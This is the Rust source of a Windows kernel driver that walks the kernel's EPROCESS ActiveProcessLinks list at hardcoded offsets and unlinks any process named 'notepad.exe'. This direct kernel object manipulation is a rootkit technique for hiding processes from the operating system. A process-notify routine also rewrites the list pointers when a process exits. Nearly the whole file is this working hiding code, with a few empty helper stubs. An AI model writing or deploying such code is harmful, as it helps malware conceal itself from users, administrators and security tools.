
#![no_std]
#![allow(unused_imports)]
#![no_main]

use core::panic::PanicInfo;
use core::arch::asm;


use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntpsapi::ZwCurrentProcess;
use winapi::km::wdm::DRIVER_OBJECT;
use winapi::shared::basetsd::PSIZE_T;
use winapi::shared::ntdef::*;
use winapi::ctypes::*;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::vc::vcruntime::size_t;


use ntapi::ntexapi::*;
use ntapi::ntmmapi::*;

#[derive(Copy,Clone)]
#[repr(C)]
#[repr(packed)]
pub struct MM_COPY_ADDRESS{
    address: *mut c_void
}


#[link(name = "ntoskrnl")]
extern "C"{
    pub fn DbgPrint(format: *const u8, ...) -> NTSTATUS;
    pub fn MmCopyMemory(targetaddress: *mut c_void,
    sourceaddress: MM_COPY_ADDRESS, 
    numberofbytes: usize,
    flags: u32, byteswritten: *mut usize) -> i32; 
    pub fn MmIsAddressValid(virtualaddress: *mut c_void) -> u8;
    pub fn ZwOpenProcess(outhandle: *mut c_void,
    accessmask: u32, objectattrs: *mut OBJECT_ATTRIBUTES,
    pclientid: *mut CLIENT_ID);

    pub fn PsGetCurrentProcessId() -> *mut c_void;
    pub fn PsGetCurrentThreadId() -> *mut c_void;
    pub fn PsLookupProcessByProcessId(pid: HANDLE,peprocess: *mut c_void)-> NTSTATUS;
    pub fn PsSetCreateProcessNotifyRoutine( functionpointer: *mut c_void, toremove: u8) -> NTSTATUS;
    
    //pub fn ZwOpenProcess() -> *mut c_void;
}


#[link(name="ntdll")]
extern "C"{
    pub fn NtClose(handle: *mut c_void) -> NTSTATUS;

}




#[derive(Clone,Copy)]
#[repr(C)]
#[repr(packed)]
pub struct idtr{
    limit: i16,
    registervalue: i64
}


#[derive(Copy, Clone)]
#[repr(C)]
#[repr(packed)]
pub struct idtentry64{
    offsetlow: u16,
    selector: u16,
    reserveddpltype: u16,
    offsetmiddle: u16,
    offsethigh: u32,
    reserved1: u32
}




pub extern "C" fn processcreationnotifyroutine(parentid: HANDLE, pid: HANDLE, iscreated:u8) {
   
   // process is created = 1
    /*if iscreated==1{

        let mut eprocess:u64 = 0 ;
        let res = unsafe{PsLookupProcessByProcessId(pid, &mut eprocess as *mut _ as *mut c_void)};
        if res==STATUS_SUCCESS{

           
            let mut pname = unsafe{core::ptr::read((eprocess as usize + 0x5a8) as *const [u8;15])};
            unsafe{DbgPrint("process created pid: %s\n\0".as_ptr(), pname.as_mut_ptr() as *mut c_void)};


        }

    }*/


    if iscreated==0{
        let mut eprocess:u64 = 0 ;
        let res = unsafe{PsLookupProcessByProcessId(pid, &mut eprocess as *mut _ as *mut c_void)};
        if res==STATUS_SUCCESS{

           
            let prevflinkaddress = unsafe{core::ptr::read((eprocess as usize + 0x448+0x8) as *mut u64)};
            unsafe{core::ptr::write(prevflinkaddress as *mut u64, (eprocess + 0x448))};

            let mut nextlinkaddress = unsafe{core::ptr::read((eprocess+0x448) as *mut u64)};
            nextlinkaddress += 8;
            unsafe{core::ptr::write(nextlinkaddress as *mut u64, eprocess+0x448)};

        }
    }


}



static targetpid: u32 = 0;


#[no_mangle]
pub extern "system" fn driver_entry(_driver: &mut DRIVER_OBJECT,
     _: *const UNICODE_STRING) -> u32 {
    unsafe {

        
       PsSetCreateProcessNotifyRoutine(processcreationnotifyroutine as *mut c_void , 0);
      



       let mut eprocess:u64 = 0 ;
       let status =  PsLookupProcessByProcessId(PsGetCurrentProcessId(),
       &mut eprocess as *mut _ as *mut c_void );

       
       if status==0{
          // DbgPrint("eprocess at: %I64x\n\0".as_ptr(), eprocess);

           // 0x448 activeprocesslinks
           // 0x5a8  imagefilename 
           let activeprocesslinks = eprocess + 0x448;


           // reading 8 bytes at activeprocesslinks
           let mut byteswritten = 0;
           let mut firstaddress:u64 = 0 ;
           let mmcopy = MM_COPY_ADDRESS{address:activeprocesslinks as *mut c_void};
           let res = MmCopyMemory(&mut firstaddress as *mut _ as *mut c_void,  
               mmcopy, 
               8, 
               2, 
               &mut byteswritten);

           let mut nexteprocess = 0;
           let mut flink = firstaddress;

           if res==STATUS_SUCCESS{
               loop{
                   nexteprocess = flink - 0x448;

                   let imagenamepointer = nexteprocess + 0x5a8;
   
                   //DbgPrint("processname: %s\n\0".as_ptr(), imagenamepointer as *mut c_void);
   
   
                   let mut name = core::ptr::read(imagenamepointer as *mut [u8;11]);
                   let procname = core::str::from_utf8(&name).unwrap();
                   //DbgPrint("procname: %s\n\0".as_ptr(), name.as_mut_ptr() as *mut c_void);

                   if "notepad.exe".as_bytes() == &name{
                       let previouseprocess = core::ptr::read((nexteprocess+0x448+0x8) as *mut u64)-0x448;
                       let forwardforwardlink = core::ptr::read((nexteprocess+0x448) as *mut u64);
                       //let backwardbackwardlink = core::ptr::read((previouseprocess+0x448+0x8) as *mut u64);

                       core::ptr::write((previouseprocess+0x448) as *mut u64, forwardforwardlink);
                       core::ptr::write((forwardforwardlink+0x8) as *mut u64, (previouseprocess+0x448));


                   }
            
                   let mut byteswritten = 0;
                   
                   let mmcopy = MM_COPY_ADDRESS{address:(nexteprocess+0x448) as *mut c_void};
                   let res = MmCopyMemory(&mut flink as *mut _ as *mut c_void,  
                       mmcopy, 
                       8, 
                       2, 
                       &mut byteswritten);
                   
                   if byteswritten!=8 || res!=0{
                       break;
                   }
                   
                   if flink==firstaddress{
                       break;
                   }


               }
               
           }
           

       }


       







    }

    0
}



pub fn readstringat(){
    unsafe{



    }
}




pub fn readbytesat(addr: *mut c_void, n: u64){
    unsafe{
        // addr contains address to read
        // n contains number of bytes to read

        let mmcopy = MM_COPY_ADDRESS{address: addr};
        //let mut destination:[u8;n] = [0;n];
        

    }
}




#[no_mangle]
pub extern "system" fn __CxxFrameHandler3(_: *mut u8, _: *mut u8, _: *mut u8, _: *mut u8) -> i32 {
    unimplemented!()
}
#[export_name = "_fltused"]
static _FLTUSED: i32 = 0;

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

